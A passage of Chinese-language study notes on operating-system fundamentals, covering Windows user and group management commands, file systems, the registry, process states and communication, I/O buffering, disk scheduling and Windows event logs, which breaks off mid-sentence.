title="Windows用户管理"></a>Windows用户管理</h2><p>每个账户有自己<strong>唯一的SID</strong>（安全标识符）<br>账户组作用：简化权限赋予</p><h3 id="本地账户与域账户"><a href="#本地账户与域账户" class="headerlink" title="本地账户与域账户"></a><strong>本地账户与域账户</strong></h3><p>Windows账户分为<u>本地用户账户</u>和<u>域账户</u>两种。</p><ul><li>本地帐户是<strong>本机建立</strong>的用户帐户</li><li><strong>域账户</strong>是<strong>域服务器</strong>上由管理员分配给你的帐户。</li></ul><p><strong>本地用户账户和域账户的区别：</strong></p><p>1.本地用户账户<u>存储在本地的<strong>sam</strong>数据库</u>中，而<strong>域账户存储在AD(active directory)中</strong>。</p><p>2.使用<em>本地用户账户</em>的时候，用户只能使用该账户<strong>登录到本地</strong>计算机上，而使用<u>域账户用户可以在整个域环境中所有的计算机上进行登录</u>。</p><p>3.本地账户只能在<strong>账户所属的计算机</strong>上进行管理，每个计算机上的<strong>管理员单独管理自己机器上的本地账户</strong>。而域账户通过AD用户和计算机管理工具进行统一的管理。</p><h3 id="常见内置组"><a href="#常见内置组" class="headerlink" title="常见内置组"></a>常见内置组</h3><p>1）Administrators：管理员组<br>2）Backup Operators：具有备份还原权限的组<br>3）Guests：来宾组<br>4）Network ：网络配置组<br>5）Remote：远程桌面组<br>6）Users：新用户默认组<br>7）Print ：打印机组</p><h3 id="特殊本地内置组"><a href="#特殊本地内置组" class="headerlink" title="特殊本地内置组"></a>特殊本地内置组</h3><p>9）Everyone：任何一个用户都属于这个组<br>10）Authenticated Users：任何使用有效用户来登录此计算机的用户，都属于此组<br>11）Interactive:任何在<strong>本地登录</strong>（按ctrl+alt+del键登录）的用户，都属于此组<br>12）Network:通过<strong>网络登录</strong>此计算机的用户，都属于此组</p><h3 id="组管理命令"><a href="#组管理命令" class="headerlink" title="组管理命令"></a>组管理命令</h3><pre><code class="php+HTML">1.net localgroup #输出所有组2.net localgroup groupname #输出指定组的成员3.net localgroup groupname /add #添加组4.net localgroup groupname /del #删除组5.net localgroup groupname username /del # 从组中踢出用户6.net localgroup groupname username /add # 添加用户到组</code></pre><h3 id="内置账户"><a href="#内置账户" class="headerlink" title="内置账户"></a>内置账户</h3><p><strong>内置账号无法删除</strong></p><p>1.<strong>administrator</strong> #管理员<br>2.<strong>system</strong> #系统账户，最高权限<br>3.<strong>local services</strong> #本地服务账户，user的权限<br>4.<strong>network services</strong> #网络服务账户，user权限</p><h3 id="用户管理命令"><a href="#用户管理命令" class="headerlink" title="用户管理命令"></a>用户管理命令</h3><pre><code class="php+HTML">1.net user #输出所有用户2.net user kk password #修改用户kk的密码3.net user ko password /add #添加新用户ko4.net user ko /del #删除ko用户</code></pre><h2 id="Windows文件系统"><a href="#Windows文件系统" class="headerlink" title="Windows文件系统"></a>Windows文件系统</h2><p><strong>文件系统，就是文件的储存方式。</strong></p><p>每个驱动器都有自己的根目录结构，这样形成了多个树并列的情形，如图所示：</p><p><img src="https://img-blog.csdnimg.cn/20190309112559820.png" alt="Windows文件系统结构"></p><h3 id="常见的文件系统"><a href="#常见的文件系统" class="headerlink" title="常见的文件系统"></a>常见的文件系统</h3><p><em>NTFS(最常用)</em><br><em>FAT32</em><br><em>FAT(FAT16)</em><br><em>ExFAT</em></p><p><strong>FAT</strong>:在软盘、闪存(U盘)，以及很多嵌入式设备上常见，<strong>16位</strong>，支持的分区<strong>最大为2GB</strong>。</p><p><strong>FAT32</strong>: 兼容性好,是为<strong>32位计算机</strong>设计的，每个<em>簇容量都固定为4KB（32位）</em>,<u>文件不能超过 2^32 - 1 个字节（ 4GB）</u>。分区容量下限是512MB，不同操作系统的上限不同，最大不超过2TB ，一般系统32GB 。例如Win2000最大支持32GB FAT32分区，而WinXP最大可达2TB FAT32分区。</p><p><strong>ExFAT(FAT64)</strong>:ExFAT是专门为闪存设计的文件系统，单个文件的存放和传输<strong>突破了4GB的限制</strong>。<strong>兼容性好</strong>，在windows、Linux、Mac系统上都是可以读写。</p><p><strong>NTFS</strong>:采用“日志式”的文件系统，记录磁盘的详细读写操作，<strong>最大支持的独立分区是2TB</strong>。</p><p>在稳定性和安全性方面，NTFS要优于FAT32，但是FAT32兼容较旧的存储设备及系统，如DOS系统等。两者的主要<strong>区别</strong>体现在：<br>1.<strong>FAT32不支持存放和传输超过4G的单个文件</strong><br>2.NTFS无法运行在DOS系统下，FAT32则可以兼容DOS系统</p><p><strong>FAT32与exFAT的区别：</strong></p><p>大多数U盘在格式化时选用FAT32为默认文件系统。它最大优点就是在一个不超过8GB的分区中，FAT32分区格式的每个簇容量都固定为4KB，可以<strong>大大地减少磁盘的浪费，提高磁盘利用率</strong>。</p><ul><li>比如传输12k的文件。FAT32每个簇4K，占三个簇，浪费0K。exFAT每个簇256K，占一个簇，浪费244K。</li></ul><p><strong>NTFS相比FAT会让闪存性能降低</strong></p><ul><li>NTFS因为要记录磁盘的详细操作，对U盘这种<strong>快闪存储介质</strong>会造成较大的负担。<ul><li>比如同样存取一个文件，在 <u>NTFS系统上的读写次数就会比FAT32多</u>，理论上NTFS格式的U盘比较容易损坏。</li><li>U盘带宽有限，NTFS文件系统频繁读写占据通道会让<u>磁盘性能降低</u>。</li></ul></li></ul><h2 id="Windows服务"><a href="#Windows服务" class="headerlink" title="Windows服务"></a>Windows服务</h2><p>Microsoft Windows 服务可以在 Windows 中长时间运行应用程序，非常适合需要长时间运行功能时使用。</p><h2 id="Windows注册表"><a href="#Windows注册表" class="headerlink" title="Windows注册表"></a>Windows注册表</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>注册表是Microsoft Windows中的一个重要的数据库，用于存储系统和应用程序的<strong>设置信息</strong>，在运行中输入<code>regedit</code>即可进入。</p><ul><li><img src="https://img-blog.csdnimg.cn/20190327075949591.png" alt="Windows注册表结构"></li></ul><h3 id="注册表的组成结构"><a href="#注册表的组成结构" class="headerlink" title="注册表的组成结构"></a>注册表的组成结构</h3><ul><li><p>注册表由键（<code>key</code>，或称“项”）、子键（<code>subkey</code>，子项）和值项（<code>value</code>）构成的<code>hive</code>文件。</p></li><li><p>注册表的结构是一个<strong>树状结构</strong>。一个<strong>键</strong>（<code>key</code>，或称“项”）就是一个节点，<strong>子键</strong>（<code>subkey</code>)就是这个节点的<strong>子节点</strong>，子健也是键。键的<u>一条属性被称为一个<code>value</code>（值项）</u>，<code>value</code>由名称、类型、数据类型和数据组成。<u>一个键可以有多个值</u>，每个值的名称不同，<strong>如果值名称是空，则该值为该键的默认值</strong>。</p></li><li><pre><code class="php+HTML">5个根键:1.HKEY_CLASSES_ROOT说明：启动应用程序所需的全部信息。2.HKEY_CURRENT_USER说明：当前登录用户的配置信息。3.HKEY_LOCAL_MACHINE说明：本地计算机的系统信息，包括硬件和操作系统信息，安全数据和各类软件设置信息。4.HKEY_USERS说明：所有用户的配置数据，这些数据只有在用户登录系统时才能访问。5.HKEY_CURRENT_CONFIG说明：硬件的配置信息，从HKEY_LOCAL_MACHINE中映射出来。</code></pre></li></ul><h3 id="注册表基本数据类型"><a href="#注册表基本数据类型" class="headerlink" title="注册表基本数据类型"></a>注册表基本数据类型</h3><p><strong>二进制值（reg_binary）</strong>:多数<strong>硬件信息</strong>以二进制数据存储，<u>以十六进制格式显示</u>在注册表编辑器中<br><strong>字符串值（reg_sz）</strong>:包括字符串的注册表键，使用字符串数据类型<br><strong>双字节值（reg_dword）</strong>:4个字节的32位信息。它在<u>出错控制功能上用处极大</u>，其数据一般<u>以十六进制格式显示</u>在注册表编辑器中<br><strong>多字符串值(reg_multi_sz)</strong>:将<u>一系列项目</u>作为单独的一个值。对于多种网络协议、多个项目、设备列表以及其他<u>类似的列表项目</u>来说，可以使用多字符串值<br><strong>可扩充字符串值（reg_expand_sz</strong>）：代表一个可扩展的字符串</p><h2 id="Windows进程"><a href="#Windows进程" class="headerlink" title="Windows进程"></a>Windows进程</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ul><li>进程是程序在处理器上的的一次动态执行过程，是程序执行的一个实例。</li></ul><h3 id="进程的组成"><a href="#进程的组成" class="headerlink" title="进程的组成"></a>进程的组成</h3><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/p.jpg" alt="进程的组成" style="zoom:50%;"><ul><li><p><strong>进程控制块（PCB）</strong>:用来描述进程的数据结构。<strong>每个进程都维护了一个PCB</strong>，用来保存与该进程有关的<strong>各种状态信息</strong>，主要包括以下信息</p><ol><li><strong>进程描述信息</strong><ul><li>进程标识符，每个进程都有一个<strong>唯一的标识号</strong>。</li><li>用户标识符进程归属的用户，<u>用户标识符主要为共享和保护服务</u>。</li></ul></li><li><strong>进程控制和管理信息</strong><ul><li>描述进程当前的<strong>状态信息</strong>(就绪、运行)。</li><li>进程优先级，描述进程抢占处理机的优先级。</li><li>进程间通信信息。</li><li>使用的资源关联信息。</li></ul></li><li><strong>资源分配清单</strong><ul><li>用于说明内存地址空间或虚拟<strong>地址空间的状况</strong>。</li><li>所<strong>打开文件的列表</strong>和所使用的<strong>输入/输出设备信息</strong>。</li></ul></li><li><strong>处理机相关信息</strong><ul><li>用户可见寄存器，<strong>控制和状态寄存器</strong>如程序计数器，程序状态字；</li><li><strong>栈指针</strong>，系统带调用/中断处理和返回时需要用到它。</li></ul></li></ol></li><li><p><strong>程序段</strong>:被进程调度程序<u>调度到CPU执行的程序代码段</u>。程序可被多个进程共享，即<strong>多个进程可以运行同一个程序</strong>。</p></li><li><p><strong>数据段</strong>:可以是程序加工处理的原始数据，也可以是程序执行时产生的中间或最终结果。</p></li><li><p><strong>共享区域</strong>:多个进程共享操作系统代码、内存、数据。</p></li><li><p><strong>系统栈</strong>:<strong>用于返回</strong>。保存调用参数，返回值和返回地址。</p></li></ul><h3 id="进程的五状态模型"><a href="#进程的五状态模型" class="headerlink" title="进程的五状态模型"></a>进程的五状态模型</h3><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.jpg" alt="进程三大基本状态" style="zoom:50%;"><ul><li><em>创建态</em>：进程正在被创建时，操作系统会为进程分配资源、<strong>初始化PCB</strong>；</li><li><strong>就绪态</strong>：当进程创建完成后，便进入“就绪态”， 处于就绪态的进程已经<strong>具备运行条件</strong>， 但由于<u>没有空闲CPU，就暂时不能运行</u>；</li><li><strong>运行态</strong>：进程此时在CPU上运行，那么这个进程 处于“运行态”。CPU会执行该进程对应的程序(执行指令序列)；</li><li><strong>阻塞态</strong>：进程运行的过程中，可能会<strong>等待某个事件的发生</strong>(如等待某种系统资源的分配，或者等待其他进程的响应)。<u>在这个事件发生之前，进程无法继续往下执行，此时操作系统会 让这个进程下CPU，并让它进入“阻塞态”。</u>当CPU空闲时，又会选择另一个“就绪态”进程上CPU运行；</li><li><em>终止态</em>：进程执行 exit 系统调用，请求操作系统终止该进程。此时该进程会进入“终止态”，操作系统会<u>让该进程下CPU， 并回收内存空间等资源，最后还要回收该进程的PCB</u>。当终止进程的工作完成之后，这个进程就彻底消失了。</li></ul><h3 id="进程的七状态模型"><a href="#进程的七状态模型" class="headerlink" title="进程的七状态模型"></a>进程的七状态模型</h3><p>七状态模型是在五状态模型上新增了<strong>阻塞挂起和就绪挂起状态</strong></p><p><strong>背景</strong>:在五状态模型中，一个进程被允许进入，就会被完全载入内存。<u>但是I/O活动的速度比处理器慢得多</u>，因此<u>所有进程都处于阻塞(等待某事件)状态比较常见，所以会占用大量内存</u>，使得<strong>新进程的进入请求无法满足</strong>。</p><p><strong>解决</strong>:把处于阻塞态的进程<strong>从内存换到磁盘中</strong>去，加入到“挂起队列”。</p><p><strong>阻塞挂起态</strong>:进程在外存中并等待一个事件。</p><ul><li><strong>阻塞态→阻塞挂起态</strong>:1.没有就绪进程，将其换出。2.即使有就绪进程，为满足系统基本性能需求也会换出。</li><li><strong>阻塞挂起态→阻塞态</strong>:阻塞挂起态进程优先级高于所有就绪态进程且阻塞进程的事件很快就会发生。</li></ul><p><strong>就绪挂起态</strong>:进程在外存中，但只要被载入内存就可以被调度执行。</p><ul><li><strong>就绪挂起态→就绪态</strong>:内存中没有就绪态进程，就会将其调入就绪态。</li><li><strong>就绪态→就绪挂起态</strong>:1.得到足够空间的唯一方法是挂起一个就绪态进程时。2.高优先级阻塞态进程很快就绪。</li></ul><h3 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h3><p><strong>用“原语实现”进程的控制</strong></p><p><strong>为什么要使用原语对进程控制呢？</strong></p><ul><li><p><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/l.jpg" alt="状态切换"></p><ul><li><p>在上图中，假设PCB中的变量 state 表示进程当前所处状态，1表示就绪态，2表示阻塞态，假设此时进程2等待的事件发生了，则操作系统中，负责进程控制的内核程序至少需要做这样两件事:</p><ul><li>1.将PCB 2的 state 设为 1; </li><li>2.将PCB 2从阻塞队列放到就绪队列;</li></ul><p>完成了<strong>第一步后收到中断信号</strong>，那么<strong>PCB 2 的 state=1，但是它却被放在阻塞队列里，</strong><u>主要原因就是第一，第二步操作不是一个原子操作</u>。<span id="jump"> </span></p></li></ul></li><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/x.jpg" alt="计算机系统的层级结构" style="zoom: 67%;"></li><li><p><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/z.jpg" alt="进程控制原语"></p></li><li><p><u>用原语实现进程控制</u>。原语特点是<strong>执行期间不允许中断</strong>，即:原子操作。</p><ul><li><em>原子操作可以是一个步骤，也可以是多个操作步骤，但是其顺序不可以被打乱，也不可以被切割而只执行其中的一部分。</em></li><li>也就是说，利用这一性质，中断机制将处于关闭状态，<strong>直到运行完两步才会接受中断</strong>，如此就不会出现上述的矛盾情况。</li></ul></li></ul><h4 id="进程控制五大原语"><a href="#进程控制五大原语" class="headerlink" title="进程控制五大原语"></a>进程控制五大原语</h4><ul><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/20200315163724449.png" alt="创建"></li><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/20200315164109198.png" alt="终止"></li><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/20200315165047253.png" alt="阻塞和唤醒"></li><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/20200315165313589.png" alt="切换"></li></ul><p><strong>进程控制原语都在做三件事</strong>:</p><ol><li>更新PCB信息<ul><li>所有的进程控制原语一定都会<u>修改进程状态标志</u>；</li><li>剥夺当前运行进程的CPU使用权必然需要保存其运行环境；</li><li>某进程开始运行前必然要<strong>恢复其运行环境</strong>；</li></ul></li><li>将PCB插入合适的队列</li><li>分配/回收资源</li></ol><h3 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h3><p><em>进程通信就是指进程之间的信息交换</em></p><p>进程通信分为<strong>共享存储，消息传递，管道通信</strong></p><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/20190804173223845.jpg" alt="概述" style="zoom:50%;"><h4 id="共享存储"><a href="#共享存储" class="headerlink" title="共享存储"></a>共享存储</h4><p><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/v2-05897b729b9b931ec6d89c058ed2d403_1440w.png" alt="信息交换方式"></p><ul><li>进程是分配系统资源的单位(包括内存地址空间)，因此各<strong>进程拥有的内存地址空间相互独立</strong>，如1001这个地址空间不能够同时给两个进程。为了保证安全，<u>一个进程不能直接访问另一个进程的地址空间</u>。</li><li>共享存储分为两种<ul><li>1.<strong>基于数据结构的共享</strong>:比如共享空间里只能放一个长度为10的数组(<strong>由用户负责控制</strong>设置数据结构)。这种共享方式速度慢、传输数据少、限制多，属于低级通信方式；</li><li>2.<strong>基于存储区的共享</strong>:在内存中画出一块共享存储区，通过对该共享区的读/写交换信息实现通信，数据的形式、存放位置都<strong>由进程控制</strong>，而不是操作系统。相比之下，这种共享方式速度更快、传输数据量更大，是一种高级通信方式。</li></ul></li></ul><h4 id="管道通信"><a href="#管道通信" class="headerlink" title="管道通信"></a>管道通信</h4><p><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/f.jpg" alt="两进程直接通过管道通信"></p><ul><li><p><em>“管道”是指用于连接读和写进程的一个共享文件，又名pipe 文件。其实就是在内存中开辟 一个大小固定的缓冲区。</em></p><ul><li>管道只能采用<strong>半双工通信</strong>，某一时间段内只能实现<strong>单向的传输</strong>。如果要实现<strong>双向同时</strong>通信，则需要设置两个管道；</li><li>各进程要<strong>互斥</strong>地访问管道，即一个进程正在访问<a href="https://baike.baidu.com/item/%E4%B8%B4%E7%95%8C%E8%B5%84%E6%BA%90/1880269">临界资源</a>，另一个要访问该资源的进程必须等待。</li><li>数据以<strong>字符流</strong>的形式写入管道，当管道<strong>写满时</strong>，写进程的<strong>write()系统调用将被阻塞</strong>，等待读进程将数据取走。当<strong>读进程将数据<u>全部取走</u>后，管道变空，此时读进程的</strong>read()系统调用将被阻塞；</li><li>写满才能读，读空才能继续写;</li><li>从管道读数据是<strong>一次性操作</strong>，<u>数据一旦被读取，它就从管道中被抛弃</u>，释放空间以便写更多的数据</li></ul></li><li><p><strong>实例:Linux Shell管道</strong></p><ul><li><p>Linux 管道使用竖线|连接多个命令，<code>|</code>被称为管道符。</p><ul><li>Linux 管道的具体语法格式如下：<code>command1 | command2 [ | commandN... ]</code></li></ul></li><li><p><em>例如使用 mysqldump（一个数据库备份程序）来备份一个叫做 wiki 的数据库</em>：</p><ul><li><pre><code class="php+HTML">mysqldump -u root -p &#39;123456&#39; wiki &gt; /tmp/wikidb.backupgzip -9 /tmp/wikidb.backupscp /tmp/wikidb.backup username@remote_ip:/backup/mysql/</code></pre></li></ul></li></ul><p>上述这组命令主要做了如下任务：</p><ul><li><p>mysqldump 命令用于将名为 wike 的数据库备份到文件 /tmp/wikidb.backup；其中<code>-u</code>和<code>-p</code>选项分别指出数据库的用户名和密码。</p><ul><li>gzip 命令用于压缩较大的数据库文件以节省磁盘空间；其中<code>-9</code>表示最慢的压缩速度最好的压缩效果。</li><li>scp 命令（secure copy，安全拷贝）用于将数据库备份文件复制到 IP 地址为 remote_ip 的备份服务器的 /backup/mysql/ 目录下。其中<code>username</code>是登录远程服务器的用户名，命令执行后需要输入密码。</li><li>可以使用管道将 mysqldump、gzip、ssh 命令相连接，这样就避免了创建临时文件 /tmp/wikidb.backup</li></ul></li><li><p><strong>使用管道后的命令如下所示</strong>：</p><pre><code class="php+HTML">mysqldump -u root -p &#39;123456&#39; wiki | gzip -9 | ssh username@remote_ip &quot;cat &gt; /backup/wikidb.gz&quot;</code></pre></li><li><p>例如使用管道显示按用户名排序后的当前登录系统的用户的信息。</p><ul><li><p><code>who</code>列出当前用户，<code>sort</code>用每行开头的第一个字符来进行排序</p></li><li><pre><code class="php+HTML">[c.biancheng.net]$ who | sortmozhiyan :0           2019-04-16 12:55 (:0)oozhiyan pts/0        2019-04-16 13:16 (:0)</code></pre></li></ul></li></ul></li></ul><h4 id="消息传递"><a href="#消息传递" class="headerlink" title="消息传递"></a>消息传递</h4><p><strong>概念</strong>:进程间的数据交换以格式化的消息(Message)为单位。进程通过操作系统提供的“<strong>发送消息/接收消息</strong>”两个原语进行数据交换。</p><p><strong>消息传递分类:</strong></p><ol><li><p><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/v.jpg" alt="直接通信"></p><ul><li><strong>直接通信方式</strong>:发送进程直接把消息发送给接收进程，并<u>将它挂在接收进程的消息缓冲队列上</u>，<u>接收进程从消息缓冲队列中取得消息</u>，如上图所示。</li></ul></li><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/v2-f628cf410e6371bf18c5ba9afd64729b_1440w.jpg" alt="间接通信" style="zoom:50%;"><ul><li><strong>间接通信方式</strong>:发送进程把消息发送到某个中间实体，<u>接收进程从中间实体取得消息</u>。这种中间实体一般称为信箱，这种通信方式又称<strong>信箱通信</strong>方式。</li></ul></li></ol><h4 id="三种通信方式比较"><a href="#三种通信方式比较" class="headerlink" title="三种通信方式比较"></a>三种通信方式比较</h4><p><strong>消息队列和管道都是内核对象</strong>，所执行的操作也都是系统调用，而这些<u>数据最终是要存储在内存中执行的</u>。所以消息队列和管道基本上都是<strong>4次拷贝</strong>:</p><ol><li>从用户空间的buf中将数据拷贝到内核buf中(内核态位于<a href="#jump">用户态</a>之下，原数据发送)</li><li>内核buf将数据拷贝到内存中(数据处理)</li><li>内存将数据拷贝到到内核buf(新数据返回)</li><li>内核buf将数据拷贝到用户空间的buf(新数据返回)</li></ol><p>共享存储只需要<strong>两次拷贝</strong>:</p><ol><li>从输入文件到共享内存区 </li><li>从共享内存区输出到文件</li></ol><h3 id="常用进程管理命令"><a href="#常用进程管理命令" class="headerlink" title="常用进程管理命令"></a>常用进程管理命令</h3><pre><code class="php+HTML">1.netstat -ano | findstr 80 #查看80端口的进程2.taskkill /im cmd.exe #结束某进程3.taskkill /pid 3378 #结束pid为3378的进程</code></pre><h2 id="Windows设备管理"><a href="#Windows设备管理" class="headerlink" title="Windows设备管理"></a>Windows设备管理</h2><p>设备管理为了<strong>克服设备与cpu速度不匹配问题</strong>，使主机和设备并行工作</p><h3 id="i-o设备的控制方式"><a href="#i-o设备的控制方式" class="headerlink" title="i/o设备的控制方式"></a>i/o设备的控制方式</h3><ul><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy81ODUzMTU5LWFlNWYyNzU3ZTBhNGQwNjgucG5n.png" alt="轮询方式" style="zoom: 80%;"></li><li><p><strong>轮询方式</strong>:如图a所示，缺点是<strong>串行工作</strong>，需要等待设备，<strong>cpu参与数据传输</strong>，每次读<strong>一个字</strong>的数据，<strong>cpu花费大量时间等待输入输出的循环检测</strong>，效率低下。</p></li><li><p><strong>中断方式</strong>:如图b所示，以<strong>字节</strong>为单位传输，不需要等待设备，<strong>部分并行工作</strong>(没有完全并行)，<strong>cpu参与数据传输</strong>，<u>i/o设备要向cpu发送中断信号，cpu才回来写入数据</u>。</p></li><li><p><strong>DMA方式</strong>:如图c所示，以<strong>块</strong>为单位传输，不需要等待设备，<strong>数据直接从i/o设备→内存或者内存→i/o设备</strong>。只在传送<strong>开始和结束需要cpu干预</strong>，数据传输是在控制器控制下完成。</p><ul><li><strong>优点:cpu不参与数据传输，并行工作</strong></li></ul></li><li><p><strong>i/o通道控制方式</strong>:通道是特殊的处理机。以<strong>一组数据块</strong>为单位，<strong>只需向I/O通道发送一条I/O指令</strong>(输入/输出指令，是特权指令，用户态→<a href="#jump">内核态</a>)，以给出其所<u>要执行的通道程序的首地址和要访问的I/O设备</u>，通道接到该指令后，通过<u>执行通道程序便可完成CPU指定的I/O任务</u>，数据传送<strong>结束时向CPU发中断请求</strong>。</p></li><li><p><strong>i/o通道与DMA方式的区别</strong>：</p><ul><li><strong>DMA</strong>方式需要<strong>CPU来干预传输的数据块（数据块大小、传输的内存位置等）</strong>，而通道方式中这些信息是由通道控制的。</li><li>每个DMA控制器对应一台设备与内存传递数据，而一个<strong>通道可以控制多台设备与内存的数据交换</strong>。</li></ul></li></ul><h3 id="i-o缓冲区"><a href="#i-o缓冲区" class="headerlink" title="i/o缓冲区"></a>i/o缓冲区</h3><p><strong>缓冲区</strong>:是由<strong>操作系统内核</strong>进行管理，<strong>位于内核</strong>的存储区域。</p><p><strong>背景</strong>:cpu运算速率远高于i/o设备速率，导致cpu停下等待输出设备。</p><p><strong>缓冲区解决的问题</strong>:</p><ol><li>缓和cpu和i/o设备间<strong>速率不匹配</strong></li><li><u>减少处理器中断频率</u>，减轻cpu负担<ul><li>如果缓冲区为一位，需要100ms中断一次，那么缓存区为八位（存够八位数据），则时间放宽为800ms中断一次</li></ul></li><li>解决数据粒度（数据单元大小）不匹配</li><li>提高cpu和i/o的<strong>并行性</strong></li></ol><ul><li><strong>单缓冲区</strong>:当缓冲区不为空时不能往里面放入数据，<strong>只有缓冲区为空才能放入数据</strong>且<strong>一次放入的数据必须充满整个缓冲块</strong>，才能从缓冲区把数据传出。<ul><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/202005252140571.png" alt="单缓冲" style="zoom:67%;"></li></ul></li><li><strong>双缓冲区</strong>:<strong>同一时刻可以实现双向的数据传输</strong><ul><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/20200525214124568.png" alt="双缓冲区" style="zoom: 67%;"></li></ul></li><li><strong>环形缓冲区</strong>:设置三个指针，用于指示可用缓冲区g的指针i，空缓冲区r的指针o，正在使用的缓冲区c的指针p。<ul><li>1.<strong>getbuf过程</strong>。计算进程要<strong>使用缓冲区数据时</strong>，把i指针指示的g缓冲区提供给进程，令p指针指向g缓冲区第一个单元，让i指针指向下一个g缓冲区。当输入进程<strong>使用空缓冲区装数据时</strong>，把r指针所指的缓冲区提供给输入进程，同时把o指针指向下一个o缓冲区。</li><li>2.<strong>releasebuf过程</strong>。<strong>当计算进程把c缓冲区数据提取完毕时</strong>，c缓冲区改为r缓冲区。<strong>当输入进程把缓冲区装满时</strong>，把c缓冲区改成g缓冲区。</li></ul></li><li><strong>缓冲池</strong>:缓冲池由系统中共用的缓冲区组成。这些缓冲区按照同类型可以分为：<strong>空缓冲队列</strong>、<strong>装满输入数据的缓冲队列</strong>、<strong>装满输出数据的缓冲队列</strong>。<br>根据一个缓冲区在实际运算中扮演的功能不同，又设置了四种工作缓冲区：用于<strong>收容输入数据的工作缓冲区(hin)</strong> 、用于<strong>提取输入数据的工作缓冲区(sin)</strong> 、用于<strong>收容输出数据的工作缓冲区(hout)</strong> 、用于<strong>提取输出数据的工作缓冲区(sout)</strong> 。<ul><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/20200525214154186.png" alt="缓冲池" style="zoom:67%;"></li><li><strong>收容输入</strong>:从空缓冲队列摘下一个缓冲区，把数据输入其中，装满后加入输入队列</li><li><strong>提取输入</strong>:从输入队列中摘下一个缓冲区，提取完数据后加入空缓冲区队列</li><li><strong>收容输出</strong>:从空缓冲队列摘下一个缓冲区，把数据输出其中，装满后加入输出队列</li><li><strong>提取输出</strong>:从输出队列中摘下一个缓冲区，提取完数据后加入空缓冲区队列</li></ul></li></ul><h3 id="设备独立性"><a href="#设备独立性" class="headerlink" title="设备独立性"></a>设备独立性</h3><p><strong>背景</strong>:作业执行前对设备提出申请时，指定物理设备会让分配很简单。但<u>如果指定设备出现故障，则会被放到资源等待队列等待，将导致同类设备无法运行</u>。例如主机开启，网卡故障会导致声卡等其他设备也不能运行。</p><p><strong>设备独立性</strong>:不指定物理设备，指定逻辑设备，使用户作业和物理设备分开，需要建立物理设备和逻辑设备的映射。</p><h3 id="磁盘调度算法"><a href="#磁盘调度算法" class="headerlink" title="磁盘调度算法"></a>磁盘调度算法</h3><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/18464438-51a047178ff21028.jpg" alt="常见的磁盘调度算法" style="zoom:67%;"><ul><li><strong>SSTF</strong>:其缺点是对用户的服务请求的响应机会不是均等的</li><li><strong>SCAN</strong>:不仅考虑到目标磁道与当前磁道的距离，更优先考虑的是磁头的当前<strong>移动方向</strong>。例如，自里向外移动时，<u>在磁头当前移动方向上选择与当前磁头所在磁道距离最近的</u>，直到再无更外的磁道需要访问才将磁臂换向，自外向里移动。如果请求刚好在磁头前方加入队列，则它几乎马上就会得到服务；如果请求刚好在磁头后方加入队列，则它必须等待，直到磁头移到磁盘的另一端，反转方向，并返回。由于是摆动式的扫描方法，两侧磁道被访问的频率仍低于中间磁道。<ul><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/613861755_1618029572569_014AA794B8DE2B0593F9F6C4BE7243D9.png" alt="SCAN" style="zoom:67%;"></li></ul></li><li><strong>C-SCAN</strong>:循环扫描算法规定磁头单向移动。例如，只自里向外移动，当磁头<strong>移到最外</strong>的被访问磁道时，磁头<strong>立即返回到最里</strong>的欲访磁道，即将最小磁道号紧接着最大磁道号构成循环，进行扫描。<u>相比于SCAN算法，平均寻道时间更长</u>，但是对于各个位置磁道响应频率很平均。<ul><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/613861755_1618029572804_014AA794B8DE2B0593F9F6C4BE7243D9.png" alt="C-SCAN" style="zoom:67%;"></li></ul></li></ul><h2 id="Windows日志"><a href="#Windows日志" class="headerlink" title="Windows日志"></a>Windows日志</h2><p><em>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。可以用来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</em></p><h3 id="日志特点"><a href="#日志特点" class="headerlink" title="日志特点"></a>日志特点</h3><ol><li>系统内置的三个核心日志文件<u>（System，Security和Application）默认大小均为20MB</u>，记录事件数据超过20MB时，系统默认优先覆盖过期的日志记录。其它应用程序及服务日志默认最大为1MB，超过最大限制也优先覆盖过期的日志记录。</li><li>Windwos操作系统默认没有提供删除特定日志记录的功能，仅提供了删除所有日志的操作功能。也就意味着日志记录ID（Event Record 